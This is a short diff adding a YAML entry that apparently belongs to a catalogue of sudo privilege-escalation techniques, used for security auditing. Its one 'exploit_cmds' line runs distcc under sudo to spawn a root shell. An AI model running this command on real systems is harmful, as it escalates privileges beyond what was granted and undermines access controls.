@@ -1,0 +1,4 @@
+name: distcc
+binary_path: /usr/bin/distcc
+exploit_cmds:
+- sudo /usr/bin/distcc /bin/sh
